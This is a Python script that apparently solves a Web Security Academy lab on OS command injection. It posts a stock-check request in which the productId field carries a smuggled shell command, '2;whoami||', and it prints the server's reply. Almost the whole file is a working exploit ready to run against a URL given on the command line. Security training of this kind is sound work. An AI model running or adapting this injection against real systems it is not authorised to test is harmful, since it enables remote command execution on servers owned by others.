import sys
import requests
from requests.adapters import HTTPAdapter, Retry



def execute_whoami(url, session):
    response = session.post(f"{url}/product/stock", data={"productId": "2;whoami||", "storeId": "1"}, timeout=10)
    if response.status_code == 200:
        return response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

        print("(+) Executing the command \"whoami\"...")
        user = execute_whoami(url, session)
        if user:
            print(f"(+) Server's response: {user}")
        else:
            print("(-) Something went wrong, please check your URL and try again.")

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")


if __name__ == "__main__":
    main()